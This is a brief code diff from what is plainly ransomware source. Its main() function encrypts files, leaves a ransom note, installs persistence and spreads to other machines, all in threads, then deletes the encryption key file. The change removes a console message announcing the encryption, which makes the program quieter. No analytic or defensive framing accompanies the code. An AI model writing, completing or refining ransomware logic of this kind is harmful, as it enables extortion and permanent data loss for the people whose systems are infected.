@@ -221,7 +221,6 @@ def main():
     run_in_threads([lambda: encrypt_files(key), leave_ransom_note, create_persistence, propagate])
     
     os.remove(key_file_path)
-    print("Encryption complete. Your files have been encrypted and a ransom note has been left.")
 
 if __name__ == "__main__":
     main()
